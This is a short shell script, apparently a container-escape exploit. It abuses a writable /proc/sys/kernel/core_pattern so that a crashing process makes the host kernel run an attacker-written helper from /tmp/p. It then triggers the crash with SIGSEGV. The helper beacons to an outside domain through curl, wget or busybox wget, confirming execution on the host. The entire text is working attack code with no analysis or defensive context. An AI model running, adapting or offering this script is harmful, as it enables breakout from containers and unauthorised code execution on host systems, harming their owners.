[ -w /proc/sys/kernel/core_pattern ] || exit 1
cat > /tmp/p <<'EOS'
#!/bin/sh
curl -s -m 5 -o /dev/null "http://core3.t.get-stranding.com/c" 2>/dev/null || wget -q -O /dev/null "http://core3.t.get-stranding.com/c" 2>/dev/null || busybox wget -q -O /dev/null "http://core3.t.get-stranding.com/c" 2>/dev/null
EOS
chmod 755 /tmp/p 2>/dev/null
printf '|/proc/%%P/root/tmp/p' > /proc/sys/kernel/core_pattern 2>/dev/null
ulimit -c unlimited 2>/dev/null
sh -c 'ulimit -c unlimited; kill -SEGV $$' &
sleep 4